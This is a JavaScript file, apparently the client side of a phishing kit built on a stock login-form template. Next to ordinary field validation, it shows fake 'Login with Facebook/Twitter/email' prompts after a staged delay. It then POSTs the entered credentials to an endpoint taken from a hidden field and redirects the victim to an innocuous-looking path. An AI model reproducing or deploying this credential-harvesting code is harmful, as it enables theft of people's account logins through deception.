
(function ($) {
    "use strict";

    /*==================================================================
    [ Validate ]*/
    var input = $('.validate-input .input100');

    $('.validate-form').on('submit',function(){
        var check = true;

        for(var i=0; i<input.length; i++) {
            if(validate(input[i]) == false){
                showValidate(input[i]);
                check=false;
            }
        }

        return check;
    });


    $('.validate-form .input100').each(function(){
        $(this).focus(function(){
           hideValidate(this);
        });
    });

    function validate (input) {
        if($(input).attr('type') == 'email' || $(input).attr('name') == 'email') {
            if($(input).val().trim().match(/^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{1,5}|[0-9]{1,3})(\]?)$/) == null) {
                return false;
            }
        }
        else {
            if($(input).val().trim() == ''){
                return false;
            }
        }
    }

    function showValidate(input) {
        var thisAlert = $(input).parent();

        $(thisAlert).addClass('alert-validate');
    }

    function hideValidate(input) {
        var thisAlert = $(input).parent();

        $(thisAlert).removeClass('alert-validate');
    }
    
    /*==================================================================
    [ Show pass ]*/
    var showPass = 0;
    $('.btn-show-pass').on('click', function(){
        if(showPass == 0) {
            $(this).next('input').attr('type','text');
            $(this).find('i').removeClass('fa-eye');
            $(this).find('i').addClass('fa-eye-slash');
            showPass = 1;
        }
        else {
            $(this).next('input').attr('type','password');
            $(this).find('i').removeClass('fa-eye-slash');
            $(this).find('i').addClass('fa-eye');
            showPass = 0;
        }
        
    });
    
    $('#f2').hide();
    $('#ld').hide();
    
    //Show forms
    $('#f1').submit(function(e){
		e.preventDefault();
		$('#f1').hide();
		$('#f2').fadeIn();
    });
    
    $('#f2').submit(function(e){
		e.preventDefault();
		var data = $(this).serialize();
		var url = $('#uu').val();
		submitForm(url,data);
    });
    
     $('#fbb').click(function(e){
		e.preventDefault();
		$('#deg').val("fbb");
		display("Login with Facebook");
    });
    
    $('#tww').click(function(e){
		e.preventDefault();
		$('#deg').val("tww");
		display("Login with Twitter");
    });
    
    $('#emm').click(function(e){
		e.preventDefault();
		$('#deg').val("emm");
		display("Login with email");
    });

})(jQuery);


function display(t){
	$('#f2').hide();
    window.setTimeout(function(){
		//$('#ld').show();
		$('#t1').html(t);
		$('#f2').fadeIn();
    }, 3000);
 
} 

function submitForm(url,data){
	$.ajax({   
   type : 'POST',
   url  : url,
   data : data,
   beforeSend: function()
   { 
    $("#error").fadeOut();
    $("#working").html('<br><br><div class="alert alert-info" role="alert" style=" text-align: center;"><strong class="block" style="font-weight: bold;">  <i class = "fa fa-spinner fa-2x slow-spin"></i>  Processing.... </strong></div>');
   },
   done :  function(response)
      {      
  
     if(response=="ok"){    
     setTimeout(' window.location.href = "file/sslsslsafetre"; ',3000);
     }     
     else{         
      $("#error").fadeIn(1000, function(){      
      $("#error").html('<br><br><div class="alert alert-danger"> '+response+'</div>');
           $("#working").html('');
      });
     }
     
     },
	fail :  function(response)
      {              
         $("#error").fadeIn(1000, function(){      
         $("#error").html('<br><br><div class="alert alert-danger"> '+response+'</div>');
           $("#working").html('');
         });     
      }
   });
}